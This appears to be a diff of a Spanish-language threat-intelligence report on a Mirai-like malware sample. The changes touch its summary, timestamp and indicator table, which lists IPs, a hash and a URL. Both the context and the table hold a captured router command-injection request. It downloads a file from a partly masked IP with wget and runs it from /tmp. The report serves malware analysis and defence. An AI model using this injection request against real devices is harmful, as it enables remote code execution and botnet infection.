@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.
+Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se identificó 1 comando observado o extraído. Se identificaron 4 indicadores técnicos.
+
 
 ## 🏷️ Clasificación
 
@@ -15,7 +16,7 @@ Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atr
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T21:07:07+00:00`
+- **Registrado:** `2026-08-09T21:07:07.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -53,10 +54,10 @@ GET /login.cgi?cli=aa%20aa%27;wget%20http://140.233.190.XXX/dlink%20-O%20-%3E%20
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 140.233.190.XXX | static_analysis |
 | url | hxxp://140.233.190.XXX/dlink%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ | strings |
-| hash | 5aff41058326118b0bd97d48a51c5940a090b5ad0af0b909c0e96b7171c585b6 | static_analysis |
+| ip | 140.233.190.XXX | static_analysis |
 | command | GET /login.cgi?cli=aa%20aa%27;wget%20http://140.233.190.XXX/dlink%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ HTTP/1.1 | strings |
+| hash | 5aff41058326118b0bd97d48a51c5940a090b5ad0af0b909c0e96b7171c585b6 | static_analysis |
 | ip | 143.44.213.XXX | artifact_source |
 
 ## 🔎 Triage
